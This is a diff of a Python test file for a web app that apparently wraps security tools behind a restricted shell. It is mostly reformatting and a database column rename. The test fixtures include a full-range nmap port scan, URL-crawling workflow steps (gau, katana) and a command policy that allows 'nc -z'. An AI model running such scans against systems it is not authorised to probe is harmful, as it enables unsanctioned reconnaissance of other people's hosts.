-            "diagnostics_allowed_cidrs": ["127.0.0.1/32"],
-            "audit_export_max_rows": 1,
-        }):
+        with mock.patch.dict(
+            "config.CFG",
+            {
+                "diagnostics_allowed_cidrs": ["127.0.0.1/32"],
+                "audit_export_max_rows": 1,
+            },
+        ):
             resp = client.get(f"/diag/audit/export?correlation_id={correlation_id}")
         body = resp.get_data(as_text=True)
         assert resp.status_code == 200
@@ -15851,36 +16141,47 @@ class TestDiagRoute:
         def fake_iter_event_pages(filters, *, max_rows):
             page_calls.append((filters, max_rows))
             yield {
-                "events": [{
-                    "id": "aud-page-1",
-                    "created": "2026-06-06T12:00:04+00:00",
-                    "event_type": "project.link",
-                    "target_type": "project",
-                    "target_id": "proj-stream-1",
-                    "details": {"source": "test"},
-                }],
+                "events": [
+                    {
+                        "id": "aud-page-1",
+                        "created": "2026-06-06T12:00:04+00:00",
+                        "event_type": "project.link",
+                        "target_type": "project",
+                        "target_id": "proj-stream-1",
+                        "details": {"source": "test"},
+                    }
+                ],
                 "truncated": False,
             }
             yield {
-                "events": [{
-                    "id": "aud-page-2",
-                    "created": "2026-06-06T12:00:03+00:00",
-                    "event_type": "project.delete",
-                    "target_type": "project",
-                    "target_id": "proj-stream-2",
-                    "details": {"source": "test"},
-                }],
+                "events": [
+                    {
+                        "id": "aud-page-2",
+                        "created": "2026-06-06T12:00:03+00:00",
+                        "event_type": "project.delete",
+                        "target_type": "project",
+                        "target_id": "proj-stream-2",
+                        "details": {"source": "test"},
+                    }
+                ],
                 "truncated": True,
             }
 
         client = self._allowed_client()
-        with mock.patch.dict("config.CFG", {
-            "diagnostics_allowed_cidrs": ["127.0.0.1/32"],
-            "audit_export_max_rows": 2,
-        }), mock.patch("blueprints.assets.iter_event_pages", side_effect=fake_iter_event_pages), mock.patch.object(
-            shell_assets.log,
-            "info",
-        ) as log_info:
+        with (
+            mock.patch.dict(
+                "config.CFG",
+                {
+                    "diagnostics_allowed_cidrs": ["127.0.0.1/32"],
+                    "audit_export_max_rows": 2,
+                },
+            ),
+            mock.patch("blueprints.assets.iter_event_pages", side_effect=fake_iter_event_pages),
+            mock.patch.object(
+                shell_assets.log,
+                "info",
+            ) as log_info,
+        ):
             resp = client.get("/diag/audit/export?event_type=project.link")
             body = resp.get_data(as_text=True)
         assert resp.status_code == 200
@@ -15915,10 +16216,13 @@ class TestDiagRoute:
             correlation_id=correlation_id,
             created=f"{audit_date_text}T12:00:04+00:00",
         )
-        with mock.patch.dict("config.CFG", {
-            "diagnostics_allowed_cidrs": ["127.0.0.1/32"],
-            "audit_export_max_rows": 1,
-        }):
+        with mock.patch.dict(
+            "config.CFG",
+            {
+                "diagnostics_allowed_cidrs": ["127.0.0.1/32"],
+                "audit_export_max_rows": 1,
+            },
+        ):
             resp = client.get(f"/diag/audit/export?format=json&correlation_id={correlation_id}")
         payload = resp.get_json()
         assert resp.status_code == 200
@@ -15928,16 +16232,17 @@ class TestDiagRoute:
         assert [event["target_id"] for event in payload["events"]] == [newest_target_id]
         assert payload["limit"] == 1
         assert payload["truncated"] is True
-        assert payload["truncation_hint"] == (
-            "Export capped at 1 rows. Narrow the filters to include older matching rows."
-        )
+        assert payload["truncation_hint"] == ("Export capped at 1 rows. Narrow the filters to include older matching rows.")
 
     def test_html_response_contains_expected_content(self):
         client = self._allowed_client()
-        with mock.patch.dict("config.CFG", {
-            "diagnostics_allowed_cidrs": ["127.0.0.1/32"],
-            "app_name": "diag test shell",
-        }):
+        with mock.patch.dict(
+            "config.CFG",
+            {
+                "diagnostics_allowed_cidrs": ["127.0.0.1/32"],
+                "app_name": "diag test shell",
+            },
+        ):
             resp = client.get("/diag")
         body = resp.get_data(as_text=True)
         assert "diag test shell" in body
@@ -15958,21 +16263,18 @@ class TestDiagRoute:
             body = client.get("/diag").get_data(as_text=True)
         if '<td class="diag-cmd-cell"' not in body:
             pytest.skip("no top-command rows in the dev DB to assert against")
-        assert (
-            'class="diag-cmd-cell" tabindex="0" role="button" aria-expanded="false"'
-            in body
-        ), "top-command cells must carry the expand-button accessibility attrs"
+        assert 'class="diag-cmd-cell" tabindex="0" role="button" aria-expanded="false"' in body, (
+            "top-command cells must carry the expand-button accessibility attrs"
+        )
         assert "toggleCmdCell" in body, "tap-to-expand handler missing from page script"
 
     def test_top_command_cells_render_full_untruncated_command(self):
         """The 48-char server-side `truncate` is gone — full text reaches
         the DOM so the JS expand handler can show it."""
-        long_command = (
-            "nmap -sT -p 1-65535 -T4 --max-retries 5 --host-timeout 30m "
-            "-oA /workspace/scan-output ip.darklab.sh"
-        )
+        long_command = "nmap -sT -p 1-65535 -T4 --max-retries 5 --host-timeout 30m -oA /workspace/scan-output ip.darklab.sh"
         assert len(long_command) > 48, "fixture must exceed the old truncate length"
         from core.database import db_connect, db_init
+
         run_id = f"diag-long-cmd-{uuid.uuid4().hex}"
         started = "2000-01-01 00:00:00"
         finished = "2099-01-01 00:00:00"
@@ -15980,7 +16282,7 @@ class TestDiagRoute:
             db_init()
             with db_connect() as conn:
                 conn.execute(
-                    "INSERT INTO runs (id, session_id, command, started, finished, exit_code) "
+                    "INSERT INTO runs (id, personal_workspace_id, command, started, finished, exit_code) "
                     "VALUES (?, ?, ?, ?, ?, ?)",
                     (run_id, "diag-test", long_command, started, finished, 0),
                 )
@@ -15990,9 +16292,7 @@ class TestDiagRoute:
                 body = client.get("/diag").get_data(as_text=True)
             # Full command appears at least twice: in `title=` and as cell text.
             # If the old truncate were still in play we would only see it in title.
-            assert body.count(long_command) >= 2, (
-                "full command should appear in both title and cell text"
-            )
+            assert body.count(long_command) >= 2, "full command should appear in both title and cell text"
             assert "…" not in body or long_command in body
         finally:
             with db_connect() as conn:
@@ -16011,11 +16311,14 @@ class TestDiagRoute:
 
     def test_html_response_renders_zero_custom_redaction_rule_count_as_numeric_zero(self):
         client = self._allowed_client()
-        with mock.patch.dict("config.CFG", {
-            "diagnostics_allowed_cidrs": ["127.0.0.1/32"],
-            "share_redaction_enabled": True,
-            "share_redaction_rules": [],
-        }):
+        with mock.patch.dict(
+            "config.CFG",
+            {
+                "diagnostics_allowed_cidrs": ["127.0.0.1/32"],
+                "share_redaction_enabled": True,
+                "share_redaction_rules": [],
+            },
+        ):
             body = client.get("/diag").get_data(as_text=True)
         assert "custom_redaction_rule_count" in body
         assert ">0<" in body
@@ -16030,6 +16333,7 @@ class TestDiagRoute:
 
 
 # ── /allowed-commands ─────────────────────────────────────────────────────────
+
 
 class TestAllowedCommandsRoute:
     def test_returns_200(self):
@@ -16050,13 +16354,16 @@ class TestAllowedCommandsRoute:
 
     def test_restricted_when_file_present(self):
         client = get_client()
-        with mock.patch("blueprints.content.load_commands_registry", return_value={
-            "commands": [
-                {"root": "ping", "category": "Networking", "policy": {"allow": ["ping"], "deny": []}},
-                {"root": "nmap", "category": "Scanning", "policy": {"allow": ["nmap"], "deny": []}},
-            ],
-            "pipe_helpers": [],
-        }):
+        with mock.patch(
+            "blueprints.content.load_commands_registry",
+            return_value={
+                "commands": [
+                    {"root": "ping", "category": "Networking", "policy": {"allow": ["ping"], "deny": []}},
+                    {"root": "nmap", "category": "Scanning", "policy": {"allow": ["nmap"], "deny": []}},
+                ],
+                "pipe_helpers": [],
+            },
+        ):
             data = json.loads(client.get("/allowed-commands").data)
         assert data["restricted"] is True
         assert "ping" in data["commands"]
@@ -16064,34 +16371,40 @@ class TestAllowedCommandsRoute:
     def test_returns_grouped_commands_when_restricted(self):
         client = get_client()
         groups = [{"name": "Networking", "commands": ["ping", "traceroute"]}]
-        with mock.patch("blueprints.content.load_commands_registry", return_value={
-            "commands": [
-                {"root": "ping", "category": "Networking", "policy": {"allow": ["ping"], "deny": []}},
-                {
-                    "root": "traceroute",
-                    "category": "Networking",
-                    "policy": {"allow": ["traceroute"], "deny": []},
-                },
-            ],
-            "pipe_helpers": [],
-        }):
+        with mock.patch(
+            "blueprints.content.load_commands_registry",
+            return_value={
+                "commands": [
+                    {"root": "ping", "category": "Networking", "policy": {"allow": ["ping"], "deny": []}},
+                    {
+                        "root": "traceroute",
+                        "category": "Networking",
+                        "policy": {"allow": ["traceroute"], "deny": []},
+                    },
+                ],
+                "pipe_helpers": [],
+            },
+        ):
             data = json.loads(client.get("/allowed-commands").data)
         assert data["restricted"] is True
         assert data["groups"] == groups
 
     def test_returns_root_commands_for_prefixed_policy_entries(self):
         client = get_client()
-        with mock.patch("blueprints.content.load_commands_registry", return_value={
-            "commands": [
-                {"root": "nc", "category": "Networking", "policy": {"allow": ["nc -z"], "deny": []}},
-                {
-                    "root": "openssl",
-                    "category": "TLS",
-                    "policy": {"allow": ["openssl s_client", "openssl ciphers"], "deny": []},
-                },
-            ],
-            "pipe_helpers": [],
-        }):
+        with mock.patch(
+            "blueprints.content.load_commands_registry",
+            return_value={
+                "commands": [
+                    {"root": "nc", "category": "Networking", "policy": {"allow": ["nc -z"], "deny": []}},
+                    {
+                        "root": "openssl",
+                        "category": "TLS",
+                        "policy": {"allow": ["openssl s_client", "openssl ciphers"], "deny": []},
+                    },
+                ],
+                "pipe_helpers": [],
+            },
+        ):
             data = json.loads(client.get("/allowed-commands").data)
 
         assert data["commands"] == ["nc", "openssl"]
@@ -16127,41 +16440,46 @@ class TestCommandCatalogRoute:
             ],
             "pipe_helpers": [],
         }
-        feed_status = [{
-            "source": "epss",
-            "status": "stale",
-            "origin": "bundled",
-            "source_version": "2026-08-01",
-            "model_version": "v2025.03.14",
-            "published_at": "2026-08-01",
-            "age_hours": 72.0,
-            "live_refresh_enabled": False,
-        }]
-        with mock.patch("services.commands.registry.load_commands_registry", return_value=registry), \
-             mock.patch("blueprints.content.get_configured_feed_status", return_value=feed_status), \
-             mock.patch.dict("config.CFG", {"workspace_enabled": False}):
+        feed_status = [
+            {
+                "source": "epss",
+                "status": "stale",
+                "origin": "bundled",
+                "source_version": "2026-08-01",
+                "model_version": "v2025.03.14",
+                "published_at": "2026-08-01",
+                "age_hours": 72.0,
+                "live_refresh_enabled": False,
+            }
+        ]
+        with (
+            mock.patch("services.commands.registry.load_commands_registry", return_value=registry),
+            mock.patch("blueprints.content.get_configured_feed_status", return_value=feed_status),
+            mock.patch.dict("config.CFG", {"workspace_enabled": False}),
+        ):
             index_resp = client.get("/commands/catalog")
             resp = client.get("/commands/catalog/sentinel")
             disabled_resp = client.get("/commands/catalog/workspace-tool")
 
         assert index_resp.status_code == 200
         index_data = json.loads(index_resp.data)
-        assert index_data["commands"] == [{
-            "root": "sentinel",
-            "category": "Registry Group",
-            "description": "Inspect a target.",
-            "requires_secrets": [{"env": "SHODAN_API_KEY", "optional": False}],
-            "example_count": 1,
-            "subcommand_count": 0,
-            "flag_count": 1,
-        }]
+        assert index_data["commands"] == [
+            {
+                "root": "sentinel",
+                "category": "Registry Group",
+                "description": "Inspect a target.",
+                "requires_secrets": [{"env": "SHODAN_API_KEY", "optional": False}],
+                "example_count": 1,
+                "subcommand_count": 0,
+                "flag_count": 1,
+            }
+        ]
         assert "workspace-tool" not in {item["root"] for item in index_data["commands"]}
         assert index_data["groups"][0]["name"] == "Registry Group"
         assert index_data["groups"][0]["commands"] == index_data["commands"]
         assert index_data["cve_risk_feeds"] == feed_status
         assert {
-            (item["id"], tuple(item["entity_types"]), tuple(item["secret_env_names"]))
-            for item in index_data["intel_providers"]
+            (item["id"], tuple(item["entity_types"]), tuple(item["secret_env_names"])) for item in index_data["intel_providers"]
         } >= {
             ("virustotal", ("domain", "hash"), ("VT_API_KEY", "VTCLI_APIKEY")),
             ("ipinfo", ("ip",), ("IPINFO_TOKEN",)),
@@ -16170,8 +16488,7 @@ class TestCommandCatalogRoute:
             ("chaos", ("domain",), ("PDCP_API_KEY",)),
         }
         assert {
-            (item["consumer"], item["env"], tuple(item.get("fallback_envs") or []))
-            for item in index_data["secret_consumers"]
+            (item["consumer"], item["env"], tuple(item.get("fallback_envs") or [])) for item in index_data["secret_consumers"]
         } == {
             ("sentinel", "SHODAN_API_KEY", ()),
             ("intel Shodan", "SHODAN_API_KEY", ()),
@@ -16243,6 +16560,7 @@ class TestAutocompleteWorkspaceRoute:
 
 # ── /faq ──────────────────────────────────────────────────────────────────────
 
+
 class TestFaqRoute:
     def test_returns_200(self):
         client = get_client()
@@ -16264,6 +16582,7 @@ class TestFaqRoute:
 
 
 # ── /workflows ────────────────────────────────────────────────────────────────
+
 
 class TestWorkflowsRoute:
     def test_returns_200(self):
@@ -16348,12 +16667,8 @@ class TestWorkflowsRoute:
         assert historical["steps"][0]["cmd"] == (
             "gau --subs --threads 2 --timeout 10 {{domain}} | head -n 1024 > historical-urls.txt"
         )
-        assert historical["steps"][1]["cmd"] == (
-            "urlscope {{domain}} historical-urls.txt historical-scoped-urls.txt"
-        )
-        assert historical["steps"][4]["cmd"].startswith(
-            "katana -list live-scoped-urls.txt"
-        )
+        assert historical["steps"][1]["cmd"] == ("urlscope {{domain}} historical-urls.txt historical-scoped-urls.txt")
+        assert historical["steps"][4]["cmd"].startswith("katana -list live-scoped-urls.txt")
         bounded = enabled_by_title["Bounded Subdomain Assessment"]
         assert bounded["version"] == 3
         assert bounded["steps"][0]["captures"][0]["item_limit"] == 16
@@ -16397,15 +16712,18 @@ class TestWorkflowsRoute:
 
 # ── /session/preferences ─────────────────────────────────────────────────────
 
+
 class TestSessionPreferencesRoute:
     def test_tour_seen_version_round_trips_unset_current_and_stale_values(self):
         client = get_client()
         session = anonymous_session_id("tour-pref-" + uuid.uuid4().hex[:8])
         try:
-            empty = json.loads(client.get(
-                "/session/preferences",
-                headers={"X-Session-ID": session},
-            ).data)
+            empty = json.loads(
+                client.get(
+                    "/session/preferences",
+                    headers={"X-Session-ID": session},
+                ).data
+            )
             assert empty["preferences"] == {}
 
             current_resp = client.post(
@@ -16426,14 +16744,16 @@ class TestSessionPreferencesRoute:
             stale = json.loads(stale_resp.data)
             assert stale["preferences"]["pref_tour_seen_version"] == 1
 
-            loaded = json.loads(client.get(
-                "/session/preferences",
-                headers={"X-Session-ID": session},
-            ).data)
+            loaded = json.loads(
+                client.get(
+                    "/session/preferences",
+                    headers={"X-Session-ID": session},
+                ).data
+            )
             assert loaded["preferences"]["pref_tour_seen_version"] == 1
         finally:
             with sqlite3.connect(DB_PATH) as conn:
-                conn.execute("DELETE FROM session_preferences WHERE session_id = ?", (session,))
+                conn.execute("DELETE FROM session_preferences WHERE personal_workspace_id = ?", (session,))
                 conn.commit()
 
     def test_tour_seen_route_records_current_tour_version_without_losing_preferences(self):
@@ -16457,7 +16777,7 @@ class TestSessionPreferencesRoute:
             assert data["preferences"]["pref_compare_context"] == "10"
         finally:
             with sqlite3.connect(DB_PATH) as conn:
-                conn.execute("DELETE FROM session_preferences WHERE session_id = ?", (session,))
+                conn.execute("DELETE FROM session_preferences WHERE personal_workspace_id = ?", (session,))
                 conn.commit()
 
     def test_tour_seen_version_migrates_with_session_token(self):
@@ -16468,7 +16788,7 @@ class TestSessionPreferencesRoute:
             register_durable_session_token(token)
             with sqlite3.connect(DB_PATH) as conn:
                 conn.execute(
-                    "INSERT INTO session_preferences (session_id, preferences, updated) "
+                    "INSERT INTO session_preferences (personal_workspace_id, preferences, updated) "
                     "VALUES (?, ?, datetime('now'))",
                     (from_session, json.dumps({"pref_tour_seen_version": 5})),
                 )
@@ -16483,15 +16803,17 @@ class TestSessionPreferencesRoute:
             data = json.loads(resp.data)
             assert data["migrated_preferences"] == 1
 
-            prefs = json.loads(client.get(
-                "/session/preferences",
-                headers={"X-Session-ID": token},
-            ).data)
+            prefs = json.loads(
+                client.get(
+                    "/session/preferences",
+                    headers={"X-Session-ID": token},
+                ).data
+            )
             assert prefs["preferences"]["pref_tour_seen_version"] == 5
         finally:
             with sqlite3.connect(DB_PATH) as conn:
                 conn.execute(
-                    "DELETE FROM session_preferences WHERE session_id IN (?, ?)",
+                    "DELETE FROM session_preferences WHERE personal_workspace_id IN (?, ?)",
                     (from_session, token),
                 )
                 conn.execute("DELETE FROM session_tokens WHERE token = ?", (token,))
@@ -16499,6 +16821,7 @@ class TestSessionPreferencesRoute:
 
 
 # ── /shortcuts ────────────────────────────────────────────────────────────────
+
 
 class TestShortcutsRoute:
     def test_returns_200(self):
@@ -16534,6 +16857,7 @@ class TestShortcutsRoute:
 
     def test_matches_shortcuts_builtin_source(self):
         from services.commands.builtins import get_current_shortcuts
+
         direct = get_current_shortcuts(is_mac=False)
         client = get_client()
         data = json.loads(client.get("/shortcuts").data)
@@ -16542,8 +16866,7 @@ class TestShortcutsRoute:
     def test_non_mac_user_agent_renders_alt_prefix(self):
         client = get_client()
         client.environ_base["HTTP_USER_AGENT"] = (
-            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
-            "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
         )
         data = json.loads(client.get("/shortcuts").data)
         keys = [item["key"] for section in data["sections"] for item in section["items"]]
@@ -16573,6 +16896,7 @@ class TestShortcutsRoute:
 
 # ── /welcome/ascii ───────────────────────────────────────────────────────────
 
+
 class TestWelcomeAsciiRoute:
     def test_returns_200(self):
         client = get_client()
@@ -16599,6 +16923,7 @@ class TestWelcomeAsciiMobileRoute:
 
 
 # ── /welcome/hints ───────────────────────────────────────────────────────────
+
 
 class TestWelcomeHintsRoute:
     def test_returns_200(self):
@@ -16628,6 +16953,7 @@ class TestMobileWelcomeHintsRoute:
 
 # ── /atlas ───────────────────────────────────────────────────────────────────
 
+
 class TestAtlasRoutes:
     def _session_id(self):
         return anonymous_session_id("atlas-" + uuid.uuid4().hex[:8])
@@ -16640,7 +16966,7 @@ class TestAtlasRoutes:
         with db_connect() as conn:
             conn.execute(
                 "INSERT INTO runs "
-                "(id, session_id, team_id, run_kind, command, started, output_preview, output_line_count) "
+                "(id, personal_workspace_id, team_id, run_kind, command, started, output_preview, output_line_count) "
                 "VALUES (?, ?, ?, 'external', ?, ?, ?, 1)",
                 (run_id, session_id, team_id, "nmap darklab.sh", "2026-05-14T00:00:00+00:00", "[]"),
             )
@@ -16648,22 +16974,32 @@ class TestAtlasRoutes:
                 conn,
                 session_id,
                 run_id,
-                [{
-                    "text": "darklab.sh CVE-2025-49113",
-                    "entities": [
-                        {"type": "domain", "value": "darklab.sh", "canonical_value": "darklab.sh"},
-                        {"type": "cve", "value": "CVE-2025-49113", "canonical_value": "CVE-2025-49113"},
-                    ],
-                }],
+                [
+                    {
+                        "text": "darklab.sh CVE-2025-49113",
+                        "entities": [
+                            {"type": "domain", "value": "darklab.sh", "canonical_value": "darklab.sh"},
+                            {"type": "cve", "value": "CVE-2025-49113", "canonical_value": "CVE-2025-49113"},
+                        ],
+                    }
+                ],
                 team_id=team_id,
                 seen_at="2026-05-14T00:00:01+00:00",
             )
-            record_run_findings(conn, session_id, run_id, [{
-                "text": "443/tcp open https on darklab.sh",
-                "signals": ["findings"],
-                "line_index": 0,
-                "entities": [{"type": "domain", "value": "darklab.sh", "canonical_value": "darklab.sh"}],
-            }], team_id=team_id)
+            record_run_findings(
+                conn,
+                session_id,
+                run_id,
+                [
+                    {
+                        "text": "443/tcp open https on darklab.sh",
+                        "signals": ["findings"],
+                        "line_index": 0,
+                        "entities": [{"type": "domain", "value": "darklab.sh", "canonical_value": "darklab.sh"}],
+                    }
+                ],
+                team_id=team_id,
+            )
             conn.commit()
         return run_id, recorded
 
@@ -16671,7 +17007,7 @@ class TestAtlasRoutes:
         run_id = "run-" + uuid.uuid4().hex
         with db_connect() as conn:
             conn.execute(
-                "INSERT INTO runs (id, session_id, run_kind, command, started, output_preview, output_line_count) "
+                "INSERT INTO runs (id, personal_workspace_id, run_kind, command, started, output_preview, output_line_count) "
                 "VALUES (?, ?, 'external', ?, ?, ?, 1)",
                 (run_id, session_id, f"nmap {domain}", "2026-05-14T00:00:00+00:00", "[]"),
             )
@@ -16679,18 +17015,27 @@ class TestAtlasRoutes:
                 conn,
                 session_id,
                 run_id,
-                [{
-                    "text": domain,
-                    "entities": [{"type": "domain", "value": domain, "canonical_value": domain}],
-                }],
+                [
+                    {
+                        "text": domain,
+                        "entities": [{"type": "domain", "value": domain, "canonical_value": domain}],
+                    }
+                ],
                 seen_at="2026-05-14T00:00:01+00:00",
             )
-            record_run_findings(conn, session_id, run_id, [{
-                "text": f"443/tcp open https on {domain}",
-                "signals": ["findings"],
-                "line_index": 0,
-                "entities": [{"type": "domain", "value": domain, "canonical_value": domain}],
-            }])
+            record_run_findings(
+                conn,
+                session_id,
+                run_id,
+                [
+                    {
+                        "text": f"443/tcp open https on {domain}",
+                        "signals": ["findings"],
+                        "line_index": 0,
+                        "entities": [{"type": "domain", "value": domain, "canonical_value": domain}],
+                    }
+                ],
+            )
             conn.commit()
         return run_id, recorded
 
@@ -16706,21 +17051,27 @@ class TestAtlasRoutes:
         domain_id = next(item["id"] for item in recorded if item["type"] == "domain")
         headers = {"X-Session-ID": session_id}
         other_headers = {"X-Session-ID": other_session_id}
-        project = json.loads(client.post(
-            "/projects",
-            headers=headers,
-            json={"name": "Lookup Project " + uuid.uuid4().hex[:8]},
-        ).data)["project"]
-        empty_project = json.loads(client.post(
-            "/projects",
-            headers=headers,
-            json={"name": "Empty Lookup Project " + uuid.uuid4().hex[:8]},
-        ).data)["project"]
-        foreign_project = json.loads(client.post(
-            "/projects",
-            headers=other_headers,
-            json={"name": "Foreign Lookup Project " + uuid.uuid4().hex[:8]},
-        ).data)["project"]
+        project = json.loads(
+            client.post(
+                "/projects",
+                headers=headers,
+                json={"name": "Lookup Project " + uuid.uuid4().hex[:8]},
+            ).data
+        )["project"]
+        empty_project = json.loads(
+            client.post(
+                "/projects",
+                headers=headers,
+                json={"name": "Empty Lookup Project " + uuid.uuid4().hex[:8]},
+            ).data
+        )["project"]
+        foreign_project = json.loads(
+            client.post(
+                "/projects",
+                headers=other_headers,
+                json={"name": "Foreign Lookup Project " + uuid.uuid4().hex[:8]},
+            ).data
+        )["project"]
         link_response = client.post(
             f"/atlas/entities/{domain_id}/project_links",
             headers=headers,
@@ -16829,10 +17180,7 @@ class TestAtlasRoutes:
         parent = json.loads(parent_response.data)
         assert parent["match_state"] == "not_found"
         assert parent["parent_host_candidate"]["entity"]["entity_id"] == domain_id
-        lookup_completed = next(
-            call for call in lookup_info.call_args_list
-            if call.args == ("ATLAS_LOOKUP_COMPLETED",)
-        )
+        lookup_completed = next(call for call in lookup_info.call_args_list if call.args == ("ATLAS_LOOKUP_COMPLETED",))
         lookup_fields = lookup_completed.kwargs["extra"]
         assert lookup_fields["surface"] == "browser"
         assert lookup_fields["requested_type"] == "auto"
@@ -16846,12 +17194,14 @@ class TestAtlasRoutes:
         assert lookup_fields["detail_loaded"] is False
         assert lookup_fields["request_id"]
         assert isinstance(lookup_fields["duration_ms"], int)
-        private_lookup_logs = repr({
-            "debug": private_lookup_debug.call_args_list,
-            "info": lookup_info.call_args_list,
-            "warning": private_lookup_warning.call_args_list,
-            "error": private_lookup_error.call_args_list,
-        })
+        private_lookup_logs = repr(
+            {
+                "debug": private_lookup_debug.call_args_list,
+                "info": lookup_info.call_args_list,
+                "warning": private_lookup_warning.call_args_list,
+                "error": private_lookup_error.call_args_list,
+            }
+        )
         assert private_lookup_value not in private_lookup_logs
         assert "canonical_value" not in lookup_fields
         assert before_private_lookup == after_private_lookup
@@ -16862,17 +17212,12 @@ class TestAtlasRoutes:
         assert json.loads(invalid_response.data)["error"] == "invalid_lookup_value"
         assert invalid_body_response.status_code == 400
         assert json.loads(invalid_body_response.data)["error"] == "invalid_body"
-        rejected_warning = next(
-            call for call in lookup_warning.call_args_list
-            if call.args == ("ATLAS_LOOKUP_REJECTED",)
-        )
+        rejected_warning = next(call for call in lookup_warning.call_args_list if call.args == ("ATLAS_LOOKUP_REJECTED",))
         assert rejected_warning.kwargs["extra"]["reason"] == "invalid_project"
         assert rejected_warning.kwargs["extra"]["project_id"] == foreign_project["id"]
         assert private_lookup_value not in repr(lookup_warning.call_args_list)
         rejected_reasons = {
-            call.kwargs["extra"]["reason"]
-            for call in lookup_debug.call_args_list
-            if call.args == ("ATLAS_LOOKUP_REJECTED",)
+            call.kwargs["extra"]["reason"] for call in lookup_debug.call_args_list if call.args == ("ATLAS_LOOKUP_REJECTED",)
         }
         assert rejected_reasons == {"invalid_lookup_value", "invalid_body"}
 
@@ -16891,7 +17236,7 @@ class TestAtlasRoutes:
         with db_connect() as conn:
             url_run_id = "run-" + uuid.uuid4().hex
             conn.execute(
-                "INSERT INTO runs (id, session_id, run_kind, command, started, output_preview, output_line_count) "
+                "INSERT INTO runs (id, personal_workspace_id, run_kind, command, started, output_preview, output_line_count) "
                 "VALUES (?, ?, 'external', ?, ?, ?, 1)",
                 (url_run_id, session_id, "curl https://darklab.sh/login", "2026-05-14T00:01:00+00:00", "[]"),
             )
@@ -16899,20 +17244,22 @@ class TestAtlasRoutes:
                 conn,
                 session_id,
                 url_run_id,
-                [{
-                    "text": "https://darklab.sh/login",
-                    "entities": [{"type": "url", "value": "https://darklab.sh/login"}],
-                }],
+                [
+                    {
+                        "text": "https://darklab.sh/login",
+                        "entities": [{"type": "url", "value": "https://darklab.sh/login"}],
+                    }
+                ],
                 seen_at="2026-05-14T00:01:01+00:00",
             )
             child_url = conn.execute(
-                "SELECT id FROM entities WHERE session_id = ? AND type = 'url' AND canonical_value = ?",
+                "SELECT id FROM entities WHERE personal_workspace_id = ? AND type = 'url' AND canonical_value = ?",
                 (session_id, "https://darklab.sh/login"),
             ).fetchone()
             child_url_id = str(child_url["id"])
             conn.executemany(
                 "INSERT INTO entities "
-                "(id, session_id, type, canonical_value, signature_hash, host_entity_id, "
+                "(id, personal_workspace_id, type, canonical_value, signature_hash, host_entity_id, "
                 "first_seen_at, last_seen_at, occurrence_count, created) "
                 "VALUES (?, ?, 'url', ?, ?, ?, ?, ?, 1, ?)",
                 [
@@ -16931,7 +17278,7 @@ class TestAtlasRoutes:
             )
             conn.executemany(
                 "INSERT INTO entities "
-                "(id, session_id, type, canonical_value, signature_hash, host_entity_id, attributes_json, "
+                "(id, personal_workspace_id, type, canonical_value, signature_hash, host_entity_id, attributes_json, "
                 "first_seen_at, last_seen_at, occurrence_count, created) "
                 "VALUES (?, ?, 'port', ?, ?, ?, ?, ?, ?, 1, ?)",
                 [
@@ -16953,7 +17300,7 @@ class TestAtlasRoutes:
                 "INSERT INTO entity_run_links "
                 "(entity_id, run_id, first_seen_at, last_seen_at, occurrence_count) "
                 "SELECT id, ?, ?, ?, 1 FROM entities "
-                "WHERE session_id = ? AND type = 'port' AND host_entity_id = ?",
+                "WHERE personal_workspace_id = ? AND type = 'port' AND host_entity_id = ?",
                 (
                     run_id,
                     "2026-05-14T00:03:00+00:00",
@@ -16964,7 +17311,7 @@ class TestAtlasRoutes:
             )
             conn.executemany(
                 "INSERT INTO entities "
-                "(id, session_id, type, canonical_value, signature_hash, host_entity_id, "
+                "(id, personal_workspace_id, type, canonical_value, signature_hash, host_entity_id, "
                 "first_seen_at, last_seen_at, occurrence_count, created) "
                 "VALUES (?, ?, ?, ?, ?, '', ?, ?, 1, ?)",
                 [
@@ -17002,7 +17349,7 @@ class TestAtlasRoutes:
             ]
             conn.executemany(
                 "INSERT INTO runs "
-                "(id, session_id, run_kind, command, started, output_preview, output_line_count) "
+                "(id, personal_workspace_id, run_kind, command, started, output_preview, output_line_count) "
                 "VALUES (?, ?, 'external', ?, ?, ?, 1)",
                 extra_runs,
             )
@@ -17010,14 +17357,11 @@ class TestAtlasRoutes:
                 "INSERT INTO entity_run_links "
                 "(entity_id, run_id, first_seen_at, last_seen_at, occurrence_count) "
                 "VALUES (?, ?, ?, ?, 1)",
-                [
-                    (domain_id, extra_run[0], extra_run[3], extra_run[3])
-                    for extra_run in extra_runs
-                ],
+                [(domain_id, extra_run[0], extra_run[3], extra_run[3]) for extra_run in extra_runs],
             )
             conn.execute(
                 "INSERT INTO scan_target_observations "
-                "(session_id, team_id, run_id, entity_id, entity_type, canonical_value, scan_kind, "
+                "(personal_workspace_id, team_id, run_id, entity_id, entity_type, canonical_value, scan_kind, "
                 "command_root, observed_at, port_entity_count, created) "
                 "VALUES (?, '', ?, ?, 'domain', 'darklab.sh', 'port_scan', 'nmap', ?, ?, ?)",
                 (
@@ -17031,7 +17375,7 @@ class TestAtlasRoutes:
             )
             conn.execute(
                 "INSERT INTO findings "
-                "(id, session_id, run_id, entity_id, subject_key, signature_hash, severity, kind, tool_root, "
+                "(id, personal_workspace_id, run_id, entity_id, subject_key, signature_hash, severity, kind, tool_root, "
                 "first_run_id, last_run_id, first_seen_at, last_seen_at, occurrence_count, status, title, "
                 "raw_line, created) "
                 "VALUES (?, ?, ?, ?, ?, ?, 'critical', 'finding', 'nuclei', ?, ?, ?, ?, 1, 'new', ?, ?, ?)",
@@ -17152,9 +17496,7 @@ class TestAtlasRoutes:
         assert detail["detail_limits"]["findings"]["bucket"] == "direct"
         assert related_finding_resp.status_code == 200
         related_finding_detail = json.loads(related_finding_resp.data)
-        assert [finding["title"] for finding in related_finding_detail["findings"]] == [
-            "Critical child URL finding"
-        ]
+        assert [finding["title"] for finding in related_finding_detail["findings"]] == ["Critical child URL finding"]
         assert related_finding_detail["detail_limits"]["findings"] == {
             "bucket": "related_urls",
             "limit": 50,
@@ -17209,8 +17551,7 @@ class TestAtlasRoutes:
         assert ipv6_detail["intel_summary"]["status"] == "none"
         assert measured_detail is not None
         profile_reads = [
-            statement for statement in profile_statements
-            if statement.lstrip().upper().startswith(("SELECT", "WITH"))
+            statement for statement in profile_statements if statement.lstrip().upper().startswith(("SELECT", "WITH"))
         ]
